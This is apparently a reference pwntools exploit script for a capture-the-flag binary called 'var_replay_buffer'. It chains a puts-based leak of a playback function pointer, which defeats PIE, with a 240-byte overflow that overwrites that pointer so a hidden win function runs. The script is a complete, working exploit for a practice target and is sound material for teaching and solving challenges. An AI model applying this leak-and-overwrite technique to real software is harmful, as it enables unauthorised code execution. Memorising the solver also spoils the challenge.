#!/usr/bin/env python3
"""
VAR Replay Buffer — reference exploit.

Chain:
  1. Create slot 0 as a *highlight* replay (playback = highlight_reel).
  2. Compress slot 0 with 240 non-null bytes — fills data[] but does NOT
     overwrite the playback pointer that sits right after it.
  3. Play slot 0 → highlight_reel calls `puts(r->data)`, which walks past
     the 240 bytes straight into the playback pointer until it hits a NULL.
     On x86-64 PIE, the top two bytes of a text address are 0x00, so we
     get a 6-byte leak → binary base.
  4. Resolve ref_verdict (hidden win function — never referenced from any
     menu path; only reachable by tampering with a playback pointer).
  5. Compress slot 0 with 240 * b"A" + p64(ref_verdict) — this time the
     overflow *does* overwrite playback.
  6. Play slot 0 → ref_verdict() runs → flag.

The shipped binary is stripped. This solver assumes you have an unstripped
copy locally (same build flags, minus `strip`) so pwntools can resolve
symbols. If not, replace `exe.symbols[...]` with hard-coded offsets from
`objdump -d var_replay_buffer`.
"""
from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./var_replay_buffer"

def start():
    if args.REMOTE:
        host = args.HOST or "localhost"
        port = int(args.PORT or 8011)
        return remote(host, port)
    return process(BIN)

exe = ELF(BIN, checksec=False)
io = start()

def choose(n):
    io.sendlineafter(b"choice> ", str(n).encode())

def create(slot, kind, tag):
    choose(1)
    io.sendlineafter(b"slot: ", str(slot).encode())
    io.sendlineafter(b"feed type", str(kind).encode())
    io.sendlineafter(b"tag: ", tag)

def compress(slot, payload):
    choose(3)
    io.sendlineafter(b"slot: ", str(slot).encode())
    io.sendlineafter(b"raw-feed bytes: ", str(len(payload)).encode())
    io.recvuntil(b"paste feed now:\n")
    io.send(payload)

def play(slot):
    choose(4)
    io.sendlineafter(b"slot: ", str(slot).encode())

# --- Step 1: create a highlight replay (puts-based playback) ---
create(0, 2, b"kickoff")

# --- Step 2: fill data[] with 240 non-null bytes ---
compress(0, b"A" * 240)

# --- Step 3: leak playback pointer (highlight_reel) ---
play(0)
io.recvuntil(b"A" * 240)
leaked = io.recv(6).ljust(8, b"\x00")
highlight_addr = u64(leaked)
log.success(f"highlight_reel @ {hex(highlight_addr)}")

base = highlight_addr - exe.symbols["highlight_reel"]
log.success(f"binary base  @ {hex(base)}")

ref_verdict = base + exe.symbols["ref_verdict"]
log.success(f"ref_verdict  @ {hex(ref_verdict)}")

# --- Step 4: overflow playback with ref_verdict ---
payload = b"A" * 240 + p64(ref_verdict)
compress(0, payload)

# --- Step 5: trigger ---
play(0)

io.interactive()
